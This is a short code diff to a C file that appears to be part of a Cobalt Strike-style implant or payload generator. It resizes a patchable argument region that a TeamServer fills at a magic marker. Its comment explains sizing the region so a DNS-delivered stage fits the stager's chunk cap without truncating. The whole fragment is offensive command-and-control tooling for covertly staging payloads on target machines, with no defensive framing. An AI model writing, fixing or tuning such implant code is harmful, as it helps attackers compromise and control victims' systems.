@@ -88,8 +88,11 @@ setting setting_get(int id) {
 
 /* PATCH_SIZE = sizeof(arguments) */
 /* 4.9.1: TeamServer writes a 6144-byte randomized-padded blob at the AAAABBBB
- * magic (4.5 wrote 4096). 8192 keeps headroom for both TS generations. */
-#define PATCH_SIZE 8192
+ * magic (4.5 wrote 4096). Sized exactly 6144: every byte of raw .data counts
+ * against the official dns stager's 2047-chunk x 255 collection cap
+ * (522,240 chars) - the 2026-11-05 x86 dnsb overflowed it by 2KB of padding
+ * alone and the stage truncated mid-stream. */
+#define PATCH_SIZE 6144
 
 /* patch this value with something that matches our arguments structure */
 const char mystrs[4096] = "TTTTSSSSUUUUVVVVWWWWXXXXYYYYZZZZ"; /* const puts this right where we want it! */
